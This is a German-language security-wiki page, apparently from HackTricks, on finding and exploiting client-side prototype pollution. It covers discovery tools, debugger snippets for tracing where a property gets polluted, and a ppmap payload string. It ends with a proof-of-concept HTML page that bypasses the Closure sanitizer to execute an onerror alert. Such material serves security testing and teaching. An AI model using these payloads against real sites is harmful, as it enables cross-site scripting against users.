# Client Side Prototype Pollution

{{#include ../../../banners/hacktricks-training.md}}

## Entdeckung mit automatischen Werkzeugen

Die Werkzeuge [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **und** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) können verwendet werden, um **Prototype Pollution-Schwachstellen** zu **finden**.

Darüber hinaus können Sie auch die **Browsererweiterung** [**PPScan**](https://github.com/msrkp/PPScan) verwenden, um die **Seiten**, die Sie **aufrufen**, automatisch auf Prototype Pollution-Schwachstellen zu **scannen**.

### Debugging, wo eine Eigenschaft verwendet wird <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Finden der Grundursache für Prototype Pollution <a href="#id-5530" id="id-5530"></a>

Sobald eine Prototype Pollution-Sicherheitsanfälligkeit von einem der Tools identifiziert wurde und der Code nicht übermäßig komplex ist, können Sie die Sicherheitsanfälligkeit finden, indem Sie nach Schlüsselwörtern wie `location.hash`, `decodeURIComponent` oder `location.search` in den Chrome Developer Tools suchen. Dieser Ansatz ermöglicht es Ihnen, den anfälligen Abschnitt des JavaScript-Codes genau zu bestimmen.

Für größere und komplexere Codebasen besteht eine einfache Methode zur Entdeckung des anfälligen Codes aus den folgenden Schritten:

1. Verwenden Sie ein Tool, um eine Sicherheitsanfälligkeit zu identifizieren und einen Payload zu erhalten, der darauf ausgelegt ist, eine Eigenschaft im Konstruktor festzulegen. Ein Beispiel, das von ppmap bereitgestellt wird, könnte so aussehen: `constructor[prototype][ppmap]=reserved`.
2. Setzen Sie einen Haltepunkt in der ersten Zeile des JavaScript-Codes, die auf der Seite ausgeführt wird. Aktualisieren Sie die Seite mit dem Payload und pausieren Sie die Ausführung an diesem Haltepunkt.
3. Während die JavaScript-Ausführung pausiert ist, führen Sie das folgende Skript in der JS-Konsole aus. Dieses Skript signalisiert, wann die 'ppmap'-Eigenschaft erstellt wird, was bei der Lokalisierung ihres Ursprungs hilft:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Navigiere zurück zum **Sources**-Tab und wähle „Script-Ausführung fortsetzen“. Das JavaScript wird wie erwartet weiter ausgeführt, und die 'ppmap'-Eigenschaft wird verschmutzt. Die bereitgestellte Snippet erleichtert die Identifizierung des genauen Standorts, an dem die 'ppmap'-Eigenschaft verschmutzt wird. Durch die Untersuchung des **Call Stack** können verschiedene Stacks beobachtet werden, in denen die Verschmutzung aufgetreten ist.

Bei der Entscheidung, welchen Stack man untersuchen soll, ist es oft nützlich, Stacks zu zielen, die mit JavaScript-Bibliotheksdateien verbunden sind, da die Prototypverschmutzung häufig innerhalb dieser Bibliotheken auftritt. Identifiziere den relevanten Stack, indem du seine Verbindung zu Bibliotheksdateien überprüfst (sichtbar auf der rechten Seite, ähnlich wie ein bereitgestelltes Bild zur Anleitung). In Szenarien mit mehreren Stacks, wie denen in den Zeilen 4 und 6, ist die logische Wahl der Stack in Zeile 4, da er das erste Auftreten der Verschmutzung darstellt und somit die Grundursache der Schwachstelle ist. Ein Klick auf den Stack führt dich zum verwundbaren Code.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Finden von Script-Gadgets

Das Gadget ist der **Code, der missbraucht wird, sobald eine PP-Schwachstelle entdeckt wird**.

Wenn die Anwendung einfach ist, können wir **nach** **Schlüsselwörtern** wie **`srcdoc/innerHTML/iframe/createElement`** suchen und den Quellcode überprüfen, um festzustellen, ob er zu einer **JavaScript-Ausführung führt**. Manchmal finden die erwähnten Techniken überhaupt keine Gadgets. In diesem Fall zeigt eine reine Quellcodeüberprüfung einige schöne Gadgets wie das folgende Beispiel.

### Beispiel für das Finden eines PP-Gadgets im Mithil-Bibliothekscode

Überprüfe diesen Bericht: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Neukompilierung von Payloads für verwundbare Bibliotheken

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## HTML-Sanitizer-Umgehung über PP

[**Diese Forschung**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) zeigt PP-Gadgets, die verwendet werden können, um die **Sanitierungen** zu **umgehen**, die von einigen HTML-Sanitizer-Bibliotheken bereitgestellt werden:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referenzen

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
